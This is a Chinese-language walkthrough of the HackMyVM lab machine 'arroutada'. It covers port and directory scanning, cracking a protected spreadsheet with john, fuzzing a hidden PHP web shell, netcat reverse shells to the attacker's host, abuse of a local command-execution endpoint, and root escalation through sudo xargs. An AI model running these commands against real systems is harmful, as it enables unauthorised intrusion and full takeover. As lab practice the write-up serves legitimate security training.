# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 07:13 EDT
Nmap scan report for 192.168.21.11
Host is up (0.00062s latency).
MAC Address: 08:00:27:4E:CC:FB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.10
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 2.57 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.21.11
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 07:15 EDT
Nmap scan report for 192.168.21.11
Host is up (0.000078s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:4E:CC:FB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sU --min-rate 10000 -p- 192.168.21.11
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 07:15 EDT
Warning: 192.168.21.11 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.21.11
Host is up (0.00074s latency).
All 65535 scanned ports on 192.168.21.11 are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
MAC Address: 08:00:27:4E:CC:FB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 72.73 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sT -sV -O -p80 192.168.21.11         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 07:16 EDT
Nmap scan report for 192.168.21.11
Host is up (0.00026s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
MAC Address: 08:00:27:4E:CC:FB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.64 seconds
```

# 漏洞发现

80端口只有一个图片

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.11 
<div align="center"><img src="imgs/apreton.png"></div>
```

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.11 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,txt,php,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.11
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              git,html,txt,php,jpg,png,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 59]
/.php                 (Status: 403) [Size: 278]
/imgs                 (Status: 301) [Size: 313] [--> http://192.168.21.11/imgs/]                                                
/scout                (Status: 301) [Size: 314] [--> http://192.168.21.11/scout/]                                               
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 278]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

/scout

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.11/scout/

<div>
<p>
Hi, Telly,
<br>
<br>
I just remembered that we had a folder with some important shared documents. The problem is that I don't know wich first path it was in, but I do know the second path. Graphically represented:
<br>
/scout/******/docs/
<br>
<br>
With continued gratitude,
<br>
J1.
</p>
</div>
<!-- Stop please -->
<!-- I told you to stop checking on me! -->
<!-- OK... I'm just J1, the boss. -->
```

根据提示模糊测试

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.21.11/scout/FUZZ/docs/" -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -fc 403 -c -fs 0 -s
# directory-list-lowercase-2.3-big.txt
# Copyright 2007 James Fisher
#
#
# Attribution-Share Alike 3.0 License. To view a copy of this
# This work is licensed under the Creative Commons
# license, visit http://creativecommons.org/licenses/by-sa/3.0/
# Suite 300, San Francisco, California, 94105, USA.
# or send a letter to Creative Commons, 171 Second Street,
#
# on at least 1 host
# Priority-ordered case-insensitive list, where entries were found
#
j2
```

/scout/j2/docs/

![image](https://github.com/user-attachments/assets/7f9bdd43-616e-4f3d-a56a-6225e4e36f5d)

pass.txt

![image](https://github.com/user-attachments/assets/c6ed0a75-33fd-4447-8311-8d57c9825d55)

z206

![image](https://github.com/user-attachments/assets/e3de4f1e-ba8a-4649-8142-2de48551748d)

把shellfile.ods下载下来，查看一下有什么，发现有密码，用pass文件的密码没有成功，爆破一下

```
┌──(kali㉿kali)-[~]
└─$ libreoffice2john shellfile.ods > hash.txt
                                                                 
┌──(kali㉿kali)-[~]
└─$ john -wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ODF, OpenDocument Star/Libre/OpenOffice [PBKDF2-SHA1 128/128 AVX 4x BF/AES])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (crypto [0=Blowfish 1=AES]) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
john11           (shellfile.ods)     
1g 0:00:00:48 DONE (2025-07-01 08:04) 0.02058g/s 340.4p/s 340.4c/s 340.4C/s lachina..emmanuel1
Use the "--show --format=ODF" options to display all of the cracked passwords reliably
Session completed.
```

shellfile.ods

![image](https://github.com/user-attachments/assets/15875046-8441-430d-b82a-e58b38eda7b2)

http://192.168.21.11/thejabasshell.php

```
┌──(kali㉿kali)-[~]
└─$ curl -v http://192.168.21.11/thejabasshell.php
*   Trying 192.168.21.11:80...
* Connected to 192.168.21.11 (192.168.21.11) port 80
* using HTTP/1.x
> GET /thejabasshell.php HTTP/1.1
> Host: 192.168.21.11
> User-Agent: curl/8.13.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Tue, 01 Jul 2025 12:07:09 GMT
< Server: Apache/2.4.54 (Debian)
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host 192.168.21.11 left intact
```

模糊测试

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.21.11/thejabasshell.php?FUZZ=id" -w /usr/share/wordlists/rockyou.txt -fc 403 -c -fs 0 -s
a
```
/thejabasshell.php?a=id

![image](https://github.com/user-attachments/assets/8c543cc1-6d9a-4153-932c-e14947224883)

还需要一个参数b

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.21.11/thejabasshell.php?a=id&b=FUZZ" -w /usr/share/wordlists/rockyou.txt -fc 403 -c -fs 0,33 -s
pass
```

/thejabasshell.php?a=id&b=pass

![image](https://github.com/user-attachments/assets/c6d1cf9d-9e7a-4545-b935-7a4a89da960c)

/thejabasshell.php?a=nc -e /bin/sh 192.168.21.10 4444;&b=pass反弹一个shell

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.21.10] from (UNKNOWN) [192.168.21.11] 37490
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

看一下有什么

```
www-data@arroutada:/var$ cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
drito:x:1001:1001::/home/drito:/bin/bash
www-data@arroutada:/var$ ss -tnlup
ss -tnlup
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
udp   UNCONN 0      0            0.0.0.0:68        0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:8000      0.0.0.0:*          
tcp   LISTEN 0      511                *:80              *:*
www-data@arroutada:/tmp$ wget http://127.0.0.1:8000
wget http://127.0.0.1:8000
--2025-07-01 08:29:10--  http://127.0.0.1:8000/
Connecting to 127.0.0.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 319 [text/html]
Saving to: 'index.html'

index.html            0%[                    ]       0  --.-KB/s index.html          100%[===================>]     319  --.-KB/s    in 0s      

2025-07-01 08:29:10 (6.41 MB/s) - 'index.html' saved [319/319]
www-data@arroutada:/tmp$ ls -la
ls -la
total 12
drwxrwxrwt  2 root     root     4096 Jul  1 08:29 .
drwxr-xr-x 18 root     root     4096 Jan  8  2023 ..
-rw-r--r--  1 www-data www-data  319 Jul  1 08:29 index.html
www-data@arroutada:/tmp$ cat index.html
cat index.html
<h1>Service under maintenance</h1>


<br>


<h6>This site is from ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>---.+++++++++++..<<++.>++.>-----------.++.++++++++.<+++++.>++++++++++++++.<+++++++++.---------.<.>>-----------------.-------.++.++++++++.------.+++++++++++++.+.<<+..</h6>

<!-- Please sanitize /priv.php -->
```

解码得到：all HackMyVM hackers!!，根据提示再看一下/priv.php

```
www-data@arroutada:/tmp$ wget http://127.0.0.1:8000/priv.php
wget http://127.0.0.1:8000/priv.php
--2025-07-01 08:43:00--  http://127.0.0.1:8000/priv.php
Connecting to 127.0.0.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'priv.php'

priv.php                [<=>                 ]       0  --.-KB/s priv.php                [ <=>                ]     308  --.-KB/s    in 0s      

2025-07-01 08:43:00 (84.0 MB/s) - 'priv.php' saved [308]

www-data@arroutada:/tmp$ ls -la
ls -la
total 20
-rw-r--r--  1 www-data www-data  246 Jul  1 08:36 -drito
drwxrwxrwt  2 root     root     4096 Jul  1 08:43 .
drwxr-xr-x 18 root     root     4096 Jan  8  2023 ..
-rw-r--r--  1 www-data www-data  319 Jul  1 08:42 index.html
-rw-r--r--  1 www-data www-data  308 Jul  1 08:43 priv.php
www-data@arroutada:/tmp$ cat priv.php
cat priv.php
Error: the "command" parameter is not specified in the request body.

/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the "command" parameter is not specified in the request body.';
}

*/
```

加上参数再看一下

```
www-data@arroutada:/tmp$ wget --post-data='{"command":"id"}' http://127.0.0.1:8000/priv.php -q -O -
<mand":"id"}' http://127.0.0.1:8000/priv.php -q -O -
uid=1001(drito) gid=1001(drito) groups=1001(drito)


/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the "command" parameter is not specified in the request body.';
}

*/
```

反弹个shell

```
www-data@arroutada:/tmp$ wget --post-data='{"command":"nc 192.168.21.10 8888 -e /bin/bash"}' http://127.0.0.1:8000/priv.php -q -O -
</bin/bash"}' http://127.0.0.1:8000/priv.php -q -O -
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.21.10] from (UNKNOWN) [192.168.21.11] 40302
id
uid=1001(drito) gid=1001(drito) groups=1001(drito)
```

看一下都有什么

```
drito@arroutada:~$ sudo -l
sudo -l
Matching Defaults entries for drito on arroutada:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User drito may run the following commands on arroutada:
    (ALL : ALL) NOPASSWD: /usr/bin/xargs
```

![image](https://github.com/user-attachments/assets/c9e12481-d1d3-43f6-8f4d-9684f14a3fae)

```
drito@arroutada:~$ sudo /usr/bin/xargs -a /dev/null sh
sudo /usr/bin/xargs -a /dev/null sh
# id
id
uid=0(root) gid=0(root) groups=0(root)
```
